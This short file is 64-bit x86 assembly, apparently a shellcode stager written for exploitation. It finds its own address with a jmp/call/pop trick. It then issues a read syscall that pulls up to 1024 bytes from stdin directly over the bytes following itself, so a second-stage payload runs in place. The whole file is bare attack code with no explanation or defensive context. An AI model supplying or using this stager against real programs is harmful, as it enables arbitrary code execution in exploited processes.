BITS 64
global _start
_start:
    jmp stager1
pc:
    pop rsi ; +3
    jmp stager2
stager1:
    xor rax,rax
    xor rdi,rdi
    xor rdx,rdx
    inc rdx
    shl rdx,10
    call pc
stager2:
    add rsi,6
    syscall
